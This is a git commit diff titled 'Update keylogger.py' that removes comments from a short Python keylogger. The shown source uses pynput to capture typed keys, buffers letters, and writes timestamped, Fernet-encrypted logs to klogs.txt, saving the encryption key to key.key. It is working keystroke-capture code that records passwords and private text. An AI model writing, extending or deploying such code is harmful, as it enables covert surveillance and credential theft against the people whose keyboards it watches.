698b185b8fc5d332e0b1a5eba71f01b19540f578
Aleksandra <117662213+hackbutnotme@users.noreply.github.com>
2024-08-27 22:27:29 +0200

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -2,8 +2,8 @@ from pynput import keyboard
 import datetime
 from cryptography.fernet import Fernet
 
-key = Fernet.generate_key()    # Generowanie klucza szyfrowania
-cipher_suite= Fernet(key)      #
+key = Fernet.generate_key()    
+cipher_suite= Fernet(key)     
 
 with open('key.key', 'wb') as f:
     f.write(key)
@@ -13,20 +13,19 @@ buffer = []
 def on_press(key):
     global buffer 
     if key == keyboard.Key.space:
-        # szyfrowanie logów
         log = f'[{datetime.datetime.now().strftime('%Y-%m-%d, %H:%M:%S')}] {"".join(buffer)}\n'
         encrypted_logs = cipher_suite.encrypt(log.encode())
-        with open('klogs.txt', 'ab') as f: # otwarcie pliku w trybie append binary
+        with open('klogs.txt', 'ab') as f:
             f.write(encrypted_logs + b'\n')
         buffer = []
     else:
         try:
-            if key.char.isalpha():  # check if the key is letter
+            if key.char.isalpha():
                 buffer.append(key.char)
             else:
                 buffer.append(str(key).replace("'", ""))
         except AttributeError:
-            pass # ignore non-character keys like Shift, Ctrl.
+            pass 
         
 def on_release(key):
     if key == keyboard.Key.esc:
